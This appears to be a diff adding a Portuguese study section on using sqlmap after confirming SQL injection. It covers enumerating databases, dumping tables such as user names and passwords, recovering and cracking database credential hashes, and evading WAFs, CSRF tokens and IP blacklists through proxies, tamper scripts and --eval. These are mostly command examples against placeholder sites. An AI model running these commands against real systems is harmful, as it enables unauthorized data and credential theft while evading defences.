@@ -715,3 +715,601 @@ Ajuda a evitar bloqueios simples.
 | `--random-agent` | User-Agent aleatório |
 | `--tamper`       | Bypass de filtros    |
 
+
+# 🗃️ Enumeração de Banco de Dados com SQLmap
+
+Após confirmar que o alvo é vulnerável a SQL Injection, o próximo passo é:
+
+* enumerar o banco;
+* descobrir tabelas;
+* identificar colunas;
+* exfiltrar dados.
+
+Tudo isso pode ser automatizado pelo sqlmap.
+
+---
+
+# 🎯 Objetivo da Enumeração
+
+A enumeração busca recuperar:
+
+* versão do banco;
+* usuário atual;
+* permissões;
+* bancos existentes;
+* tabelas;
+* colunas;
+* credenciais;
+* dados sensíveis.
+
+---
+
+# 🔎 Enumeração Básica
+
+## 📌 Banner do banco
+
+```bash id="9e8r1n"
+--banner
+```
+
+Mostra:
+
+* versão do banco;
+* informações do SGBD.
+
+---
+
+## 👤 Usuário atual
+
+```bash id="2v7f0m"
+--current-user
+```
+
+Mostra:
+
+* usuário utilizado pela aplicação.
+
+---
+
+## 🗄️ Banco atual
+
+```bash id="x8q1da"
+--current-db
+```
+
+Retorna:
+
+* nome do banco em uso.
+
+---
+
+## 👑 Verificar privilégios DBA
+
+```bash id="2p9k7q"
+--is-dba
+```
+
+Verifica se o usuário possui permissões administrativas.
+
+---
+
+# ▶️ Exemplo Completo
+
+```bash id="s4j0m1"
+sqlmap -u "http://meusite.com/?id=1*" \
+-p id \
+--banner \
+--current-user \
+--current-db \
+--is-dba
+```
+
+---
+
+# 📋 Enumeração de Tabelas
+
+## Descobrir tabelas
+
+```bash id="f5u1rn"
+--tables
+```
+
+---
+
+## Informar banco específico
+
+```bash id="c2z7pk"
+-D nomeBanco
+```
+
+---
+
+# ▶️ Exemplo
+
+```bash id="3g0tq9"
+sqlmap -u "http://meusite.com/?id=1*" \
+-p id \
+--tables \
+-D bancodedados
+```
+
+---
+
+# 📦 Dump de Dados
+
+Depois de identificar uma tabela:
+
+```bash id="4u9z7r"
+--dump
+```
+
+E:
+
+```bash id="y5j2f3"
+-T nomeTabela
+```
+
+---
+
+# ▶️ Exemplo
+
+```bash id="z8m3t0"
+sqlmap -u "http://meusite.com/?id=1*" \
+-p id \
+--dump \
+-T usuarios
+```
+
+---
+
+# 💾 Formato da Saída
+
+```bash id="5x9k8u"
+--dump-format
+```
+
+Formatos suportados:
+
+* HTML
+* SQLite
+
+---
+
+# 🎯 Filtrando Colunas
+
+Nem sempre queremos todas as colunas.
+
+Usamos:
+
+```bash id="1w0v9a"
+-C
+```
+
+---
+
+# ▶️ Exemplo
+
+```bash id="q8y7pk"
+sqlmap -u "http://meusite.com/?id=1*" \
+-p id \
+--dump \
+-T usuarios \
+-D bancodedados \
+-C nome,senha
+```
+
+---
+
+# 📄 Limitando Resultados
+
+## Definir início e fim
+
+```bash id="r7n3zm"
+--start
+--stop
+```
+
+---
+
+# ▶️ Exemplo
+
+```bash id="f4v8q2"
+--start=1 --stop=3
+```
+
+Vai retornar:
+
+* linha 1;
+* linha 2;
+* linha 3.
+
+---
+
+# 🔍 Enumeração Condicional
+
+```bash id="3x2m1q"
+--where
+```
+
+Permite aplicar filtros SQL.
+
+---
+
+# ▶️ Exemplo
+
+```bash id="m8r1z4"
+--where="name LIKE 'f%'"
+```
+
+Retorna:
+
+* nomes iniciando com `f`.
+
+---
+
+# 🌎 Enumeração Completa
+
+## Dump de todas as tabelas de um banco
+
+```bash id="n0k8v1"
+--dump -D database
+```
+
+Sem usar `-T`.
+
+---
+
+## Dump de TODOS os bancos
+
+```bash id="9x4w0k"
+--dump-all
+```
+
+---
+
+## Ignorar bancos do sistema
+
+```bash id="2r8v3y"
+--exclude-sysdbs
+```
+
+---
+
+# ▶️ Exemplo
+
+```bash id="z1f9x8"
+sqlmap --dump-all --exclude-sysdbs
+```
+
+---
+
+# 🏗️ Enumeração Avançada
+
+# 📐 Estrutura do Banco
+
+```bash id="u7t4v9"
+--schema
+```
+
+Mostra:
+
+* databases;
+* tabelas;
+* colunas;
+* estrutura completa.
+
+---
+
+# 🔎 Busca Inteligente
+
+## Procurar tabelas
+
+```bash id="j4v0m3"
+--search -T user
+```
+
+Busca tabelas contendo:
+
+* `user`.
+
+---
+
+## Procurar colunas
+
+```bash id="k1q8x5"
+--search -C pass
+```
+
+Busca colunas contendo:
+
+* `pass`.
+
+---
+
+# 🔐 Enumeração e Quebra de Senhas
+
+Ao encontrar hashes conhecidos, o SQLmap tenta quebrá-los automaticamente.
+
+---
+
+# ▶️ Exemplo
+
+```bash id="g0v7z1"
+sqlmap -u "http://meusite.com/?id=1*" \
+-p id \
+--dump \
+-D database \
+-T tabela
+```
+
+---
+
+## Exemplo de hash
+
+```text id="0n8k4t"
+10945aa229a6d569f226976b22ea0e900a1fc219
+```
+
+O SQLmap pode:
+
+* identificar o algoritmo;
+* tentar cracking automático.
+
+---
+
+# 🔑 Credenciais do Banco
+
+```bash id="p4v6m2"
+--passwords
+```
+
+Tenta recuperar:
+
+* usuários do banco;
+* hashes;
+* credenciais internas.
+
+---
+
+# ▶️ Exemplo
+
+```bash id="3f7u2m"
+sqlmap -u "http://meusite.com/?id=1*" \
+-p id \
+--passwords \
+--batch
+```
+
+---
+
+# 🛡️ Bypass de Proteções Web
+
+# 🔒 Anti-CSRF Token
+
+Algumas aplicações exigem tokens CSRF válidos.
+
+```bash id="v8t3m1"
+--csrf-token="token"
+```
+
+---
+
+# 🎲 Unique Value Bypass
+
+Algumas aplicações exigem valores únicos por requisição.
+
+Usamos:
+
+```bash id="5m0r7z"
+--randomize
+```
+
+---
+
+# ▶️ Exemplo
+
+```bash id="8q2v1t"
+sqlmap -u "http://www.example.com/?id=1&rp=29125" \
+--randomize=rp \
+--batch
+```
+
+---
+
+# 🧮 Calculated Parameter Bypass
+
+Algumas aplicações usam:
+
+* hashes;
+* assinaturas;
+* parâmetros calculados.
+
+Exemplo:
+
+```text id="q1w8m7"
+?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+```
+
+Se o `id` mudar:
+
+* o hash precisa mudar também.
+
+---
+
+# ⚙️ Flag `--eval`
+
+Permite executar Python antes da requisição.
+
+---
+
+# ▶️ Exemplo
+
+```bash id="1m3q8v"
+--eval="import hashlib; h=hashlib.md5(id).hexdigest()"
+```
+
+O SQLmap:
+
+* recalcula o hash automaticamente.
+
+---
+
+# 🌐 Ocultação de IP
+
+## Proxy
+
+```bash id="0f8r2m"
+--proxy="socks4://IP:PORTA"
+```
+
+Usado para:
+
+* bypass de blacklist;
+* anonimização;
+* rotação de IP.
+
+---
+
+# 📂 Lista de Proxies
+
+```bash id="t2x5v7"
+--proxy-file
+```
+
+Troca automaticamente quando um proxy falha.
+
+---
+
+# 🧱 Bypass de WAF
+
+O SQLmap tenta detectar:
+
+* Cloudflare;
+* ModSecurity;
+* outros WAFs.
+
+---
+
+## Pular detecção
+
+```bash id="u7y0k4"
+--skip-waf
+```
+
+---
+
+# 🤖 User-Agent Blacklist
+
+Muitos WAFs bloqueiam:
+
+```text id="9z1w0m"
+sqlmap/1.x.x
+```
+
+---
+
+## Solução
+
+```bash id="6v3t2n"
+--random-agent
+```
+
+Troca o User-Agent automaticamente.
+
+---
+
+# 🧩 Tamper Scripts
+
+Tamper scripts modificam payloads para:
+
+* bypassar WAF;
+* evitar filtros;
+* alterar sintaxe.
+
+---
+
+# ▶️ Uso
+
+```bash id="y8m7x1"
+--tamper=randomcase
+```
+
+---
+
+# 🛠️ Principais Tampers
+
+| Tamper            | Função                        |   |   |
+| ----------------- | ----------------------------- | - | - |
+| `0eunion`         | Modifica UNION                |   |   |
+| `base64encode`    | Codifica em Base64            |   |   |
+| `between`         | Troca operadores              |   |   |
+| `commalesslimit`  | Reescreve LIMIT               |   |   |
+| `equaltolike`     | Troca `=` por `LIKE`          |   |   |
+| `percentage`      | Adiciona `%`                  |   |   |
+| `plus2concat`     | Troca `+` por CONCAT          |   |   |
+| `randomcase`      | Mistura maiúsculas/minúsculas |   |   |
+| `space2comment`   | Troca espaços por comentários |   |   |
+| `space2dash`      | Usa `--`                      |   |   |
+| `space2hash`      | Usa `#`                       |   |   |
+| `space2plus`      | Usa `+`                       |   |   |
+| `symboliclogical` | Troca AND/OR por `&&`/`       |   | ` |
+
+---
+
+# 📜 Listar Todos os Tampers
+
+```bash id="8v4z7n"
+--list-tampers
+```
+
+---
+
+# 📦 Técnicas Extras
+
+## Chunked Encoding
+
+```bash id="q0v5x8"
+--chunked
+```
+
+---
+
+## HTTP Parameter Pollution (HPP)
+
+Manipulação de parâmetros HTTP para bypass.
+
+---
+
+# 📌 Resumo Final
+
+## Enumeração permite:
+
+* descobrir bancos;
+* identificar tabelas;
+* recuperar colunas;
+* extrair dados;
+* obter credenciais.
+
+---
+
+## Flags mais importantes
+
+| Flag             | Função               |
+| ---------------- | -------------------- |
+| `--banner`       | Versão do banco      |
+| `--current-user` | Usuário atual        |
+| `--current-db`   | Banco atual          |
+| `--tables`       | Listar tabelas       |
+| `--dump`         | Extrair dados        |
+| `-D`             | Banco específico     |
+| `-T`             | Tabela específica    |
+| `-C`             | Colunas específicas  |
+| `--schema`       | Estrutura completa   |
+| `--search`       | Busca inteligente    |
+| `--passwords`    | Credenciais do banco |
+| `--proxy`        | Proxy                |
+| `--tamper`       | Bypass de WAF        |
+| `--random-agent` | Alterar User-Agent   |
+
+---
+
